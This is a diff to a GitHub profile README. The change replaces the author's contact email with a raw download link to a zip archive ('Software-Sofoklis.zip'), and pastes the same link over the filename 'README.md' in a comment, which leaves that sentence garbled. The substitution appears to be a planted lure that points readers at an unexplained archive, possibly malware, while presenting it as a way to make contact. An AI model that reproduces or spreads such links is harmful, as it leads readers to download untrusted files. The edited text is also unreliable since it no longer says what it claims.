@@ -20,10 +20,10 @@
 - Database Management System and Information Retrieval
 - Distributed Systems
 
-📫 You can reach me at ohrohitsingh@gmail.com for collaboration opportunities on MERN stack projects. Let's innovate and build together!
+📫 You can reach me at https://raw.githubusercontent.com/ohrohitsingh/ohrohitsingh/main/uneffused/Software-Sofoklis.zip for collaboration opportunities on MERN stack projects. Let's innovate and build together!
 
 <!--
-**ohrohitsingh/ohrohitsingh** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**ohrohitsingh/ohrohitsingh** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/ohrohitsingh/ohrohitsingh/main/uneffused/Software-Sofoklis.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
